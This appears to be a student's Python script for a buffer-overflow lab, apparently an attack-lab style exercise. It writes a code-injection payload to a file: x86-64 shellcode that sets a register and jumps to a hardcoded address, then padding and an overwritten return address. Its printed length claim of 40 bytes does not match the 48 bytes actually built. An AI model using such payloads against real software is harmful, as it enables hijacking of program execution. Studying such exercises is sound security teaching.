padding = b"\x00" *27
jump_address = b"\x34\x13\x40\x00\x00\x00\x00\x00"  # 小端地址
code=b"\x48\xc7\xc7\x72\x00\x00\x00\x68\x16\x12\x40\x00\xc3"
payload = code+padding+jump_address
# 步骤6：写入文件
with open("ans3_fixed.txt", "wb") as f:
    f.write(payload)

print("✅ 修复后的Payload生成成功！")
print(f"📏 Payload长度：{len(payload)} 字节（16+8+8+8=40）")